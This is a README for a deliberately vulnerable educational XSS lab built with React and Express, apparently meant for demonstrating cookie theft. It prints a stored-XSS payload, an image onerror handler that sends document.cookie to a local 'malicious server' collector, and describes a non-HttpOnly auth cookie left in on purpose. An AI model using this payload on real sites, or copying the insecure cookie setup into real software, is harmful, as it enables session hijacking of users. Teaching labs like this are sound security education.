# ⚠️ XSS Attack Demo Lab 🔥

Welcome to the **XSS Demo Lab** — an intentionally vulnerable full-stack app designed for demonstrating **Cross-Site Scripting (XSS)** attacks in action.

> 🧠 For educational purposes only. Never use this on a real/live site!

---

## 🛠️ Tech Stack

- 🔧 **Frontend**: React.js (Vite)
- 🚀 **Backend**: Node.js + Express
- 🧪 **Malicious Server**: Node.js (logs stolen cookies)
- 🍪 **Auth Token**: Stored as a cookie (intentionally vulnerable)

---

## 🎯 Objective

This lab demonstrates how an attacker can inject a malicious payload (via comment input) to **steal user cookies** and send them to a **remote attacker-controlled server**.

---

## 🧪 How It Works

1. A user logs in via the login form. The server sets a **non-HTTPOnly auth token** cookie.
2. In the comment section, a user submits the following **malicious XSS payload**:

   ```html
   <img src="x" onerror="fetch('http://localhost:9000/steal-cookie?data=' + document.cookie)" />

# Project Structure

xss-demo/
├── backend/
│   └── server.js         # Auth backend
├── frontend/
│   └── React App         # Login + vulnerable comment system
├── malicious-server/
│   └── steal.js          # Attacker's cookie collector
└── README.md
